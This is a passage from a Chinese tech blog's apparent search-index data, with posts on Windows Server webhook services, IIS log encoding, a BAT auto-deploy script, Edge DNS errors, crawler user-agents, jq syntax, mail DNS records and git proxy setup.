中找到 WinSW-x64.exe 下载到我们的 Windows Server 上，比如放到 webhook 同目录并改个顺眼的名字：webhookservice.exe，新建同名配置：webhookservice.xml： 123456789&lt;service&gt; &lt;id&gt;auto-git&lt;/id&gt; &lt;name&gt;WebHook&lt;/name&gt; &lt;description&gt;GitHub WebHook&lt;/description&gt; &lt;executable&gt;C:\\inetpub\\webhook\\webhook.exe&lt;/executable&gt; &lt;arguments&gt;-hooks webhook.yaml -verbose&lt;/arguments&gt; &lt;logmode&gt;reset&lt;/logmode&gt; &lt;onfailure action=&quot;restart&quot; /&gt;&lt;/service&gt; 配置保存后运行安装服务命令：webhookservice.exe install 就会将 C:\\inetpub\\webhook\\webhook.exe 安装成服务，并且带参数 -hooks webhook.yaml -verbose 启动。 启动后会在同目录下生成几个对应日志文件，可以自行查看服务运行状态及调用记录。 webhookservice.exe 可以管理该服务，其命令参数如下： Command Description install Installs the service. uninstall Uninstalls the service. start Starts the service. stop Stops the service. restart Stops and then starts the service. status Checks the status of the service. refresh Refreshes trties without reinstallation. customize Customizes the wrapper executable. dev Experimental commands. 配置 webhook 调用端 如前文所示，该 webhook 目的就是为了 GitHub 仓库自动同步，我们自己 Windows Server 上 webhook 监听服务已经万事俱备。 接下来需要打开 GitHub 上要触发 webhook 的仓库 setting》Webhooks》点击右上角的 add webhook：新增一个 webhook 调用： Payload URL：指向服务器的域名或者直接IP，前文提到的 webhook 地址 Content type：选择 application/json Secret：设置的口令，需与监听端配置的相同 添加 webhook 后，默认会触发一次测试调用，Response 200 表示调用成功。至此，整套 hook 环节已经全部打通。 系统运行结果 在 GitHub 仓库 webhooks 列表中，可见每个 webhook 的调用结果，点击某个进入管理界面，可见 Recent Deliveries，这里保存了每一次的调用记录： 12345678Headers Access-Control-Allow-Origin: * Content-Length: 16 Content-Type: text/plain; charset=utf-8 Date: Fri, 17 May 2024 00:02:14 GMTBody Got the payload! 如果失败，也可以查看具体的失败代码，Response 502 表示服务端异常，可以用上文提到的方法测试查找问题所在。 参考链接 webhook Windows Service Wrapper windows+webhook+github自动化部署 让Windows程序运行为服务 怎样解决CMD命令行窗口中文乱码问题","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"解决 IIS W3C格式日志中中文路径乱码问题","slug":"iis-charset-chinese","date":"2024-05-13T00:56:55.000Z","updated":"2024-05-16T11:57:28.000Z","comments":true,"path":"iis-charset-chinese.html","permalink":"https://sobaigu.com/iis-charset-chinese.html","excerpt":"","text":"前言 之前得到友链大佬 网联基地 关于 域名备案期间处理方案中针对搜索引擎做单独解析 的启发，写了个 自动同步网站的批处理 把小站在小水管机上放了一份，是个 Windows Server，所以自然而然用的 IIS 作为网站服务端程序。IIS虽然是微软的亲儿子，但习惯了 nginx、caddy等网站程序来说，IIS 真的有点不适应，有些设计甚至有点反人类。 好在只是个给搜索引擎喂料的应用， IIS10 装完做了只基本的设置就投入上线使用了，使用中发现输出的日志如果有中文出现了乱码，网络上有关这个问题的解决方案几乎没有，或者没有一篇说到点子上。 IIS10 输出 W3C 格式日志中文乱码 因为网页源码已经指定了 &lt;meta charset=&quot;utf-8&quot;&gt;，所以浏览器访问中文内容或者中文路径是没问题的，但输出的日志显示中文路径出现了乱码： 12024-05-12 08:45:56 GET /tags/淇勭綏鏂疺PS/ - 443 101.43.47.44 Googlebot - 200 21192 168 64 虽然这乱码貌似也没什么影响，但总归不知道这乱码具体内容是什么，搜索引擎爬取的是什么也不知道，也不知道正确与否。 乱码也分原始输出乱码和编辑器编码错误，如 notepad2 按 F8 尝试 UTF-8 等重新编码确认是不是原始乱码问题。如果是编辑器解码错乱那换编辑器或指定正确编码就可以了 解决日志中文乱码 这个乱码问题不是出在网页，而是 IIS10 的日志输出，所以需要额外处理。 首先打开IIS》定位到自己服务器》双击 日志，日志文件编码选择 UTF-8，然后从右侧：操作》管理服务器》重新启动（不是重启服务器），如果不能解决问题接着往下看。 网上教程没有人提及过日志输出 W3C 格式时乱码的问题，自然也没有解决方案。倒是有些提及网站乱码的解决方案：全局设置解码方式。 在既有的教程中，多半是有个 iis站点主页 .NET 全球化 的设置入口，但站长Windows Server 2022 上的 IIS10 版本没有安装 .net 组件，自然就没有这个入口，我们采用直接修改网站配置文件的方式来达到目的： 123&lt;system.web&gt; &lt;globalization requestEncoding=&quot;utf-8&quot; responseEncoding=&quot;utf-8&quot;/&gt;&lt;/system.web&gt; 将以上配置代码添加到网站配置：web.cofig，保存后重启网站，再查看 IIS 日志中有关中文的部分发现正常了： 12024-05-12 09:35:38 GET /tags/美国VPS/ - 443 101.43.47.44 Googlebot - 200 19447 159 62 IIS10网站配置样本：web.cofig 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;system.web&gt; &lt;globalization requestEncoding=&quot;utf-8&quot; responseEncoding=&quot;utf-8&quot;/&gt; &lt;/system.web&gt; &lt;system.webServer&gt; &lt;defaultDocument&gt; &lt;files&gt; &lt;clear /&gt; &lt;add value=&quot;index.html&quot; /&gt; &lt;/files&gt; &lt;/defaultDocument&gt; &lt;staticContent&gt; &lt;mimeMap fileExtension=&quot;.webp&quot; mimeType=&quot;image/webp&quot; /&gt; &lt;/staticContent&gt; &lt;/system.webServer&gt;&lt;/configuration&gt; 参考链接 域名备案不让解析怎么办？备案怎么不影响搜索引擎收录？备案期间的3种处理方案 iis 站点中文乱码 解决方案","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"一个BAT批处理实现HTML网页自动同步发布到Windows Server","slug":"bat-git-clone-auto-public","date":"2024-05-11T13:39:18.000Z","updated":"2024-05-11T13:39:18.000Z","comments":true,"path":"bat-git-clone-auto-public.html","permalink":"https://sobaigu.com/bat-git-clone-auto-public.html","excerpt":"前言 最近搞了个 Windows Server，除了挂几个客户端，平常也闲置得很，每个月 400G 的流量都用不到十分之一。刚好看了友链里大佬的一篇关于 针对搜索引擎解析域名 的方法，有种不妨一试的冲动。 从原理上讲，这种专门给大陆搜索引擎喂料的方法应该是有利于 SEO 的，毕竟：独立 IP 没有垃圾邻居，内网低延迟，反正服务器闲着也是闲着。","text":"前言 最近搞了个 Windows Server，除了挂几个客户端，平常也闲置得很，每个月 400G 的流量都用不到十分之一。刚好看了友链里大佬的一篇关于 针对搜索引擎解析域名 的方法，有种不妨一试的冲动。 从原理上讲，这种专门给大陆搜索引擎喂料的方法应该是有利于 SEO 的，毕竟：独立 IP 没有垃圾邻居，内网低延迟，反正服务器闲着也是闲着。 适用场景 因为是个 Windows Server，上面还挂着一些客户端程序，所以想着尽量节省资源，这个 Windows Server 上只托管最终的 HTML 文件，一些渲染等工作就用 GitHub Action 完成。因为不怎么考虑时效性，所以也就没有再搭个消息钩子系统触发更新的功能，这个BAT工作就简单两步： 定时触发自动任务，从 GitHub 仓库拉取最新HTML 拉取成功则自动发布到 iis 网站目录 更完善的 webhook 结合方案可见本站另外的呕心之作：Windows Server 部署 webhook 服务，并注册为系统服务守护 前置条件 安装 Git for Windows 安装 iis 并配置好网站 做好 dns 解析 将 BAT 添加到 Windows 自动任务，按需求定时触发启动 BAT 程序 BAT实现代码 123456789101112131415161718192021222324252627282930@ECHO OFF:SETVARSET PATH=%PATH%;C:\\Program Files\\Git;C:\\Program Files\\Git\\bin;SET WWW_DIR=&quot;C:\\inetpub\\xxx&quot;SET NUM=0:CLONERMDIR /S /Q GITTMPPING 127.0.0.1 -n 3 &gt;nulgit clone -b xxx https://github.com/xxx/xxx.github.io.git GITTMPIF %errorlevel%==0 ( GOTO PUBLISH) ELSE ( SET /A NUM+=1 ECHO %date% %time% Git clone failed %NUM% . &gt;&gt;auto-xxx.log IF %NUM%==3 goto END PING 127.0.0.1 -n 300 &gt;nul GOTO CLONE):PUBLISHMOVE /Y %WWW_DIR%\\web.config .\\RMDIR /S /Q %WWW_DIR%PING 127.0.0.1 -n 3 &gt;nulMOVE /Y GITTMP %WWW_DIR% &amp;&amp; MOVE /Y web.config %WWW_DIR%ECHO %date% %time% Auto publish has done. &gt;&gt;auto-xxx.log:ENDEXIT 代码解释 为什么不是 git pull？ 1git clone -b xxx https://github.com/xxx/xxx.github.io.git 因为站长用的是 hexo 渲染框架，GitHub Action 设置了发布分支 xxx 只保留一次 commit 记录，每次都没有承前启后的关系，所以只能用 git clone %WWW_DIR% 是什么？ 1SET WWW_DIR=&quot;C:\\inetpub\\xxx&quot; iis 中设置的网站目录，HTML文件需发布到该路径对外提供访问 为什么要MOVE web.config web.config 是 iis 的网站配置文件，所以这个配置文件需要保留恢复。网站配置内容见本站后续文章：解决 IIS W3C格式日志中中文路径乱码问题","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"解决Windows服务器开一段时间edge浏览器就 DNS_PROBE_STARTED 错误","slug":"DNS-PROBE-STARTED-issue-on-edge-in-windows-server","date":"2024-04-10T05:27:48.000Z","updated":"2024-04-10T05:27:48.000Z","comments":true,"path":"DNS-PROBE-STARTED-issue-on-edge-in-windows-server.html","permalink":"https://sobaigu.com/DNS-PROBE-STARTED-issue-on-edge-in-windows-server.html","excerpt":"近日逛网友提交的网站，发现华为云服务器搞活动，只要46元就能买个云服务器玩一年，就忍不住顺手买了个…… 这2G2H配置着实不低，自然是要上Windows server，反正国内Windows系统和Linux一个价格，弄个远程桌面挂QQ，挂浏览器确实爽歪歪。挂着挂着发现第二天浏览器打不开网站了……","text":"近日逛网友提交的网站，发现华为云服务器搞活动，只要46元就能买个云服务器玩一年，就忍不住顺手买了个…… 这2G2H配置着实不低，自然是要上Windows server，反正国内Windows系统和Linux一个价格，弄个远程桌面挂QQ，挂浏览器确实爽歪歪。挂着挂着发现第二天浏览器打不开网站了…… 现象 长时间挂机后，浏览器内无法访问任何网页： 大名鼎鼎的 baidu.com 都打不开，提示DNS_PROBE_STARTED、time_out等等，都是关于dns解析错误的 powershell中 ping baidu.com 能正常解析，也能正常返回值 更换dns，ipconfig /flushdns 没任何两样 重启浏览器也无济于事 重启系统后能正常打开网站，但挂一会儿又不行了 解决：取消 使用安全的DNS指定如何查找网站的网络地址 也不知道什么时候开启了 使用安全的DNS指定如何查找网站的网络地址，在edge设置中关闭该功能： edge设置》隐私、搜索和服务》往下翻找到：安全》将 使用安全的DNS指定如何查找网站的网络地址 右侧的开关点灭 再次打开大名鼎鼎的百度，顺利打开网页，一切恢复正常。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"最新搜索引擎蜘蛛机器人User Agent名称","slug":"bot-spider-names","date":"2024-04-02T05:11:40.000Z","updated":"2024-04-02T05:11:40.000Z","comments":true,"path":"bot-spider-names.html","permalink":"https://sobaigu.com/bot-spider-names.html","excerpt":"重新整理了当前各搜索引擎的蜘蛛机器人爬虫名称，方便设置waf规则。","text":"重新整理了当前各搜索引擎的蜘蛛机器人爬虫名称，方便设置waf规则。 搜索引擎 名称 蜘蛛机器人名称 备注 google.com Google Googlebot，Googlebot-Image，Google-Read-Aloud，Googlebot-Video 美国 bing.com Bing bingbot，BingPreview 美国 msn.com MSN msnbot，msnbot-media 美国 yahoo.com Yahoo Yahoo! Slurp China，Yahoo 美国 yandex.com Yandex YandexBot 俄罗斯 baidu.com 百度 Baiduspider，Baiduspider-image，baiduboxapp，Baiduspider-render 中国 so.com 360搜索 360Spider 中国 sogou.com 搜狗 SogouSpider，Sogou web spider 中国 toutiao.com 头条 Bytespider 中国 sm.cn 神马 YisouSpider 中国 soso.com 搜搜 sosospider 中国 有些名称没办法一一查证，先记录以便后续使用，可以对比以前收集的资料：各大搜索引擎蜘蛛名称『转』","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"常用 linux jq 命令语法整理","slug":"linux-jq-syntax-list","date":"2024-01-27T02:19:36.000Z","updated":"2024-01-27T02:19:36.000Z","comments":true,"path":"linux-jq-syntax-list.html","permalink":"https://sobaigu.com/linux-jq-syntax-list.html","excerpt":"近期准备对 自用的一个 shell 进行完善，有些增删改应该用 jq 来做应该事半功倍一点，将之前整理的一些资料一并做整理做个记录，方便后续查找学习。","text":"近期准备对 自用的一个 shell 进行完善，有些增删改应该用 jq 来做应该事半功倍一点，将之前整理的一些资料一并做整理做个记录，方便后续查找学习。 语法命令对照表 语法 json 命令 result str 说明 . “Hello, world!” jq ‘.’ “Hello, world!” {“foo”: 42, “bar”: “less interesting data”} jq ‘.foo’ 42 返回对象foo key 值 {“notfoo”: true, “alsonotfoo”: false} jq ‘.foo’ null 对象key不存在，返回null .[] [1,2,3] jq ‘.[]’ 1 2 3 元素遍历 {“a”: 1, “b”: 2} jq ‘.[]’ 1 2 key 对值遍历 .[&lt;string&gt;] {“foo”: 42} jq .[“foo”] 42 获取key 对应值 .[&lt;value&gt;] [{“name”:“JSON”, “good”:true}, {“name”:“XML”, “good”:false}] jq ‘.[0]’ {“name”:“JSON”, “good”:true} 返回1下标元素 [1,2,3] jq ‘.[-2]’ 2 返回倒数两个位置元素 .[start:end] [“a”,“b”,“c”,“d”,“e”] jq ‘.[2:4]’ [“c”, “d”] 下标开始到下标结束的元素 “abcdefghi” jq ‘.[2:4]’ “cd” 下标开始到下标结束的字符 .[:end] [“a”,“b”,“c”,“d”,“e”] jq ‘.[:3]’ [“a”, “b”, “c”] 首个元素到指定下标元素之间的元素 .[start:] [“a”,“b”,“c”,“d”,“e”] jq ‘.[-2:]’ [“d”, “e”] 指定下标开始到未元素之间的元素 , {“foo”: 42, “bar”: “something else”, “baz”: true} jq ‘.foo, .bar’ 42, “something else” 获取多个key值 {“user”:“stedolan”, “projects”: [“jq”, “wikiflow”]} jq ‘.user, .projects[]’ “stedolan”, “jq”, “wikiflow” b取多个元素的值 [“a”,“b”,“c”,“d”,“e”] jq ‘.[4,2]’ “e”, “c” 取4 和 2 下标元素 | [{“name”:“JSON”, “good”:true}, {“name”:“XML”, “good”:false}] jq ‘.[] | .name’ “JSON”, “XML” 管道 [] {“user”:“stedolan”, “projects”: [“jq”, “wikiflow”]} jq ‘[.user, .projects[]]’ [“stedolan”, “jq”, “wikiflow”] 元素值组成新数组 [1, 2, 3] jq ‘[ .[] | . * 2]’ [2, 4, 6] 元素值组成新数组 {} [{“user”:“stedolan”, “title”: “JQ Primer”}] jq ‘.[] | {user, title}’ {“user”:“stedolan”, “title”: “JQ Primer”} 组成对象(使用原key名) [{“user”:“stedolan”, “title”: “JQ Primer”}] jq ‘.[] | {user1: .user, title: .title}’ {“user1”:“stedolan”, “title”: “JQ Primer”} 组成对象(改变key名) + {“a”: 7} jq ‘.a + 1’ 8 算术运算符 {“a”: [1,2], “b”: [3,4]} jq ‘.a + .b’ [1,2,3,4] 数组元素合并 jq ‘{a: 1} + {b: 2} + {c: 3} + {a: 42}’ {“a”: 42, “b”: 2, “c”: 3} 合并属性 - {“a”:3} jq ‘4 - .a’ 1 算术运算符 [“xml”, “yaml”, “json”] jq ‘. - [“xml”, “yaml”]’ [“json”] 删除指定数组内元素 / 5 jq '10 / . ’ 2 算术运算符 “a,b,c,d,e” jq ‘. / “,”’ [“a”,“b”,“c”,“d”,“e”] 字符串分隔成数组 length [1,2] jq ‘. | length’ 2 数组元素个数 “string” jq ‘. | length’ 6 string 的长度 {“a”:2} jq ‘. | length’ 1 对象key个数 keys [“a”,“b”,“c”] jq ’ . | keys’ [0,1,2] 数组下标数组 {“abc”: 1, “abcd”: 2, “Foo”: 3} jq ’ . | keys’ [“Foo”, “abc”, “abcd”] kye数组 has(key) {“abc”: 1, “abcd”: 2, “Foo”: 3} jq ‘. | has(“abc”)’ true 是否包含key map(x) [1,2,3] jq ‘map(.+1)’ [2,3,4] 元素遍历 map_values(x) {“a”: 1, “b”: 2, “c”: 3} jq ‘map_values(.+1)’ {“a”: 2, “b”: 3, “c”: 4} 对象值遍历 del(path_expression) {“foo”: 42, “bar”: 9001, “baz”: 42} jq ‘del(.foo)’ {“bar”: 9001, “baz”: 42} 删除key [“foo”, “bar”, “baz”] jq ‘del(.[1, 2])’ [“foo”] 删除元素 getpath(PATHS) {“a”:{“b”:0, “c”:1}} jq ‘[getpath([“a”,“b”], [“a”,“c”])]’ [0, 1] 获取指定值 setpath(PATHS; VALUE) {“a”:{“b”:0}} jq ‘setpath([“a”,“b”]; 1)’ {“a”: {“b”: 1}} 设置指定值 jq ‘setpath([0,“a”]; 1)’ [{“a”:1}] 设置指定值 select(boolean_expression) [1,5,3,0,7] jq ‘map(select(. &gt;= 2))’ [5,3,7] select [{“id”: “first”, “val”: 1}, {“id”: “second”, “val”: 2}] jq ‘.[] | select(.id == “second”)’ {“id”: “second”, “val”: 2} select arrays, objects, iterables, booleans, numbers, normals, finites, strings, nulls, values, scalars [[],{},1,“foo”,null,true,false] jq ‘.[] | numbers’ 1 从数组中取指定类型值 add [“a”,“b”,“c”] jq ‘add’ “abc” 字符串元素拼接 [1, 2, 3] jq ‘add’ 6 sum any, any(condition), any(generator; condition) [true, false] jq ‘any’ true 有一个元素是true返回true [false, false] jq ‘any’ false [] jq ‘any’ false [1,2,3] jq ‘any(. &gt; 1)’ true all, all(condition), all(generator; condition) [true, false] jq ‘all’ false 所有元素是true返回true range(upto), range(from;upto) range(from;upto;by) jq ‘[range(4)]’ [0,1,2,3] 步进 jq ‘range(2;4)’ 2, 3 jq ‘[range(2;4)]’ [2,3] jq ‘[range(0;10;3)]’ [0,3,6,9] jq ‘[range(0;-5;-1)]’ [0,-1,-2,-3,-4] floor 3.14159 jq ‘floor’ 3 取整 sqrt 9 jq ‘sqrt’ 3 开根 tonumber [1, “1”] jq ‘.[] | tonumber’ 1, 1 转数字 tostring [1, “1”, [1]] jq ‘.[] | tostring’ [“1”, “1”, “[1]”] 转json 字符串 type [0, false, [], {}, null, “hello”] jq ‘map(type)’ [“number”, “boolean”, “array”, “object”, “null”, “string”] 查看类型 sort, sort_by(path_expression) [8,3,null,6] jq ‘sort’ [null,3,6,8] order by [{“foo”:4, “bar”:10}, {“foo”:3, “bar”:100}, {“foo”:2, “bar”:1}] jq ‘sort_by(.foo)’ [{“foo”:2, “bar”:1}, {“foo”:3, “bar”:100}, {“foo”:4, “bar”:10}] group_by(path_expression) [{“foo”:1, “bar”:10}, {“foo”:3, “bar”:100}, {“foo”:1, “bar”:1}] jq ‘group_by(.foo)’ [[{“foo”:1, “bar”:10}, {“foo”:1, “bar”:1}], [{“foo”:3, “bar”:100}]] 聚合函数group by min, max, min_by(path_exp), max_by(path_exp) unique, unique_by(path_exp) reverse contains(element) “foobar” jq ‘contains(“bar”)’ true [“foobar”, “foobaz”, “blarp”] jq ‘contains([“baz”, “bar”])’ true [“foobar”, “foobaz”, “blarp”] jq ‘contains([“bazzzzz”, “bar”])’ false {“foo”: 12, “bar”:[1,2,{“barp”:12, “blip”:13}]} jq ‘contains({foo: 12, bar: [{barp: 12}]})’ true {“foo”: 12, “bar”:[1,2,{“barp”:12, “blip”:13}]} jq ‘contains({foo: 12, bar: [{barp: 15}]})’ false indices(s) “a,b, cd, efg, hijk” jq ‘indices(&quot;, &quot;)’ [3,7,12] 返回出现元素下标位置集合 [0,1,2,1,3,1,4] jq ‘indices(1)’ [1,3,5] [0,1,2,3,1,4,2,5,1,2,6,7] jq ‘indices([1,2])’ [1,8] 参数s可以输入为数组 index(s), rindex(s) “a,b, cd, efg, hijk” jq ‘index(&quot;, &quot;)’ 3 indexof “a,b, cd, efg, hijk” jq 'rindex(&quot;, &quot;) 12 lastIndexOf inside “bar” jq ‘inside(“foobar”)’ true 包含元素 {“foo”: 12, “bar”: [{“barp”: 15}]} jq ‘inside({“foo”: 12, “bar”:[1,2,{“barp”:12, “blip”:13}]})’ false startswith(str) [“fo”, “foo”, “barfoo”, “foobar”, “barfoob”] jq ‘[.[] | startswith(“foo”)]’ [false, true, false, true, false] 开始于 endswith(str) 结束于 combinations, combinations(n) [[1,2], [3, 4]] jq ‘combinations’ [1, 3], [1, 4], [2, 3], [2, 4] 组合_笛卡尔积_ [0, 1] jq ‘combinations(2)’ [0, 0], [0, 1], [1, 0], [1, 1] ltrimstr(str) rtrimstr(str) [“fo”, “foo”, “barfoo”, “foobar”, “afoo”] jq ‘[.[] | ltrimstr(“foo”)]’ [“fo”,“”,“barfoo”,“bar”,“afoo”] split(str) split join(str) [“a”,1,2.3,true,null,false] jq ‘join(&quot; &quot;)’ “a 1 2.3 true false” 转string指定分隔符 while(cond; update) until(cond; next) 4 jq ‘[.,1] until(.[0] &lt; 1; [.[0] - 1, .[1] * .[0]]) | .[1]’ 24 (4*3*2*1) foreach tojson Format strings and escaping ### ### @text ### ### @json ### ### @html ### ### @uri ### ### @csv ### ### @tsv ### ### @sh ### ### @base64 “This is a message” jq '@base64 “VGhpcyBpcyBhIG1lc3NhZ2U=” 加密 @base64d ### ### 解密 ==, != &gt;, &gt;=, &lt;=, &lt; and/or/not +=, -=, *=, /=, %=, //= if A then elif B else C end // {} jq ‘.foo // 42’ 42 提供默认值 isempty(exp) limit(n; exp) [0,1,2,3,4,5,6,7,8,9] jq ‘[limit(3;.[])]’ [0,1,2] first(expr), last(expr), nth(n; expr) 10 jq ‘[first(range(.)), last(range(.)), nth(./2; range(.))]’ [0,9,5] first, last, nth(n) 10 jq ‘[range(.)] | [first, last, nth(5)]’ [0,9,5] ? 忽略异常 参考链接 常用 linux jq 命令语法整理 linux shell jq命令 合并json文件 jq append json array jq 常用操作 使用 Shell 脚本来处理 JSON jq简易教程 jq基本用法：读取访问 jq中文手册 A playground for jq","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"宝塔邮局优化解决 `hostname` 信息得分大幅提升","slug":"software-postfix-mailinfo-hostname","date":"2024-01-23T06:20:29.000Z","updated":"2024-01-23T06:20:29.000Z","comments":true,"path":"software-postfix-mailinfo-hostname.html","permalink":"https://sobaigu.com/software-postfix-mailinfo-hostname.html","excerpt":"","text":"前言 之前怀疑宝塔邮局到达率，实际上邮件测试也只有3.5分，所以最近一直在折腾邮件系统。iRedMail 折腾了好几遍，可最终还留下个暂时解决不了的问题：客户端SMTP发信时提示连接服务器失败。 客户端可以收信，系统各端口访问正常，网页版收发信件也没问题，发出的信件经 mail-tester.com 测试分值几乎满分。可惜，就是解决不了不能外部发信的问题。 有了折腾 iRedMail 的经验，回过头再来优化下宝塔邮局。 优化项目 邮件测试显示存在的问题主要有： PTR 记录不过关 主机xxx与xx不匹配，具体忘记截图了 既然知道问题了，那就朝提示的信息请优化。 各种DNS解析 以下各种记录，请根据自己服务器实际情况设置，一般邮件系统会提示。设置完可以通过以下命令验证，也可以通过网站查询：https://www.whatsmydns.net/ PTR（rDNS） 就是通过IP反查主机名，一般VPS后台能自己绑定，不能绑定的给服务商发工单处理。 设置好后，可以用此命令测试结果： 1nslookup 8.8.8.8 服务器IP A记录 就是把域名解析到你邮件服务器： 类型：A 名称：如 mail 记录值： 如 10x.16x.19x.11x 验证命令： 1nslookup mail.xxxx.win MX记录 配置内容： 类型：MX 名称：@ 或一级域名如 xxxx.win 邮件服务器：就是前一步做A记录的那个，如 mail.xxxx.win 查询验证命令： 1nslookup -type=mx xxxx.win SPF记录 类型：TXT 名称：@ 或一级域名如 xxxx.win 内容：v=spf1 mx ~all 验证命令： 1nslookup -type=txt xxxx.win DMARC记录 类型：TXT 名称：_dmarc 内容：v=DMARC1; p=none; pct=100; rua=mailto:admin@xxxx.win 验证命令： 1nslookup -type=txt _dmarc.xxxx.win DKIM记录 类型：TXT 名称：default._domainkey 或者 dkim._domainkey ，根据邮件系统提示来，宝塔邮局是 default._domainkey 内容：v=DKIM1;k=rsa;p=MIG…… ，这是一串很长的字符串，iRedMail 需要去除双引号和换行拼接，宝塔邮局提供直接复制。 验证命令： 12nslookup -type=txt default._domainkey.xxxx.winnslookup -type=txt dkim._domainkey.xxxx.win 如果记录验证不通过，收件方将提示邮件发送者不可信，查看看到如下错误： 1dkim=fail(Bad signature) hostname 这个主机名比较坑，可以用 hostname -f 查询，见本站之前的记录文章。 在设置完这些后，postfix 给留了个坑，查看邮件原文可见老的 hostname 信息，这个信息是很早之前的 hostname： 123456789Received: from xxx-4aebdd ([2607:f130:0:f3::aaaa:aaaa]) by newxmmxszc96.qq.com (NewMX) with SMTP id E1720475 for &lt;admin@qq.com&gt;; Mon, 29 Nov 2021 08:56:23 +0800X-QQ-mid: xmmxszc96t163814xxxxtebzr1d2zX-QQ-XMAILINFO: MOGuJKokHloM75uz8dxxxrH+vnbIE9n1iuJzmAhtVuxVfxxxx6/hFesAIIJaU9 ttUm/awDNtZJ+IxEnNjlQ03GOcxgTNOmjGMSxxxxW7 ...Received: from [127.0.0.1] (localhost [127.0.0.1]) by xxx-4aebdd (Postfix) with ESMTPA id 3473260EDB 本来第一怀疑就是 postfix 配置文件 /etc/postfix/main.cf，可宝塔邮局界面上打开此配置文件按主机名关键词搜索却无任何匹配，一直信了宝塔的搜索结果。最后通过 vi 打开搜索才发现是宝塔的坑： 1myhostname = mail.xxxx.win //将此行设置为你想展示的主机信息 这个应该是 postfix 在安装的时候自动取的 hostname 值，网上有些说法是为了安全，还需要加其他的过滤规则插件将主机信息隐藏，不知道是否会影响反垃圾邮件，暂且不管。 结果验证 经以上优化设置后，垃圾邮件测试一番，效果满意，宝塔邮局也可以战！ WOW! 完美，你现在可以开始发送了。 得分 ： 9.5/10 SpamAssassin喜欢你 你的发件人身份已验证。 [SPF] 你的发件服务器 10x.16x.19x.11x 授权使用该发件地址 noreply@xxxx.win 你的 DKIM 签名有效。 您的邮件通过了 DMARC 测试 你的发件服务器 10x.16x.19x.11x 与 mail.xxxx.win 成功关联。 Your domain name xxxx.win is assigned to a mail server. 你的主机名mail.xxxx.win已分配了一台邮件服务器。 Your message could be improved 你的发件IP在1个黑名单中。 将你的服务器IP地址 (10x.16x.19x.11x) 与 24 个最常见的 IPv4 黑名单进行匹配。被列入 Barracuda ( -0.5 )","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"设置Git通过代理连接，解决GitHub仓库无法更新等","slug":"git-set-proxy-for-github","date":"2024-01-22T04:39:47.000Z","updated":"2024-01-22T04:39:47.000Z","comments":true,"path":"git-set-proxy-for-github.html","permalink":"https://sobaigu.com/git-set-proxy-for-github.html","excerpt":"","text":"最近用 GitHub 各种问题，把4年前攒的知识重新翻出来，陈年知识又重见天日了。 前言 由于某种原因，某些地区无法正常访问GitHub这个全球最大同性交友社区，造成一批死肥宅无法愉快搞基。 虽然挂代理后网页能开了，但在使用Git工具拉取和推送仓库这种体力活仍然不得行，哪怕是已经在代理客户端上设置了使用全局代理，尤其是使用vmess代理的时候，此时我们可以尝试对Git进行额外代理设置。 设置命令 Git设置或取消代理方式连接网络，只需要执行以下命令： 123456#设置使用http/https本地代理git config --global https.proxy http://127.0.0.1:1080git config --global https.proxy https://127.0.0.1:1080#取消http/https本地代理git config --global --unset http.proxygit config --global --unset https.proxy 以上方式如果还不能解决，可以再次尝试设置sock5代理： 12git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27; 如果只针对GitHub设置代理，则用如下命令： 12#只对github.comgit config --global http.https://github.com.proxy socks5://127.0.0.1:1080 对于使用 ssh:// 协议的，可以配置socks5代理，在 ~/.ssh/config 文件内容后面添加几行： 123Host github.comUser gitProxyCommand connect -S 127.0.0.1:1080 %h %p 适用场景 hexo等发布到GitHub时失败，错误提示：“xx time out” 更新GitHub仓库无响应 $ git push ssh: connect to host github.com port 22: Network is unreachable fatal: The remote end hung up unexpectedly 拉取或者提交代码时超时报错 [info] ssh: connect to host github.com port 22: Connection timed out fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. 参考文档 git 设置和取消代理","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"php composer.phar update：A facade root has not been 